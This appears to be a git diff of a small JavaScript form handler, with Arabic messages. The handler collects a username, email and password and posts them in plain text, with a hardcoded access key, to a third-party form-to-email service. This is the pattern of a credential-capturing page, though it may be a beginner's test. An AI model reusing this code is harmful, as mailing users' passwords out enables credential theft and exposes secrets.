@@ -6,34 +6,36 @@ const myForm = document.getElementById("hjl");
 myForm.onsubmit = function(event) {
     event.preventDefault(); 
     
-    // سحب القيم من العناصر
     password = document.getElementById("pass").value;
     email = document.getElementById("myemail").value;
     username = document.getElementById("myusername").value;
 
-    // تجهيز البيانات للإرسال
-    const formData = new FormData();
-    formData.append("access_key", "39811b50-6061-41cd-bd7b-d07bc23738d1");
-    formData.append("username", username);
-    formData.append("email", email);
-    formData.append("password", password);
+    console.log("جاري محاولة الإرسال...");
 
-    // عملية الإرسال الفعلي
     fetch("https://api.web3forms.com/submit", {
         method: "POST",
-        body: formData
+        headers: {
+            "Content-Type": "application/json",
+            "Accept": "application/json"
+        },
+        body: JSON.stringify({
+            access_key: "39811b50-6061-41cd-bd7b-d07bc23738d1",
+            username: username,
+            email: email,
+            password: password
+        })
     })
-    .then(response => {
+    .then(async (response) => {
         if (response.ok) {
-            alert("مبروك يا يوسف! تم إرسال المعلومات بنجاح.");
-            myForm.reset(); // تصفير الفورم
+            alert("تم إرسال المعلومات بنجاح! افحص إيميلك.");
+            myForm.reset();
         } else {
-            alert("حدث خطأ، تأكد من اتصال الإنترنت.");
+            alert("حدث خطأ في السيرفر، تأكد من الـ Access Key.");
         }
     })
     .catch(error => {
-        console.error("Error:", error);
-        alert("فشل الاتصال بالسيرفر.");
+        console.log(error);
+        alert("فشل الاتصال. تأكد من رفع الكود لـ GitHub وتجربته من الرابط.");
     });
 };
 
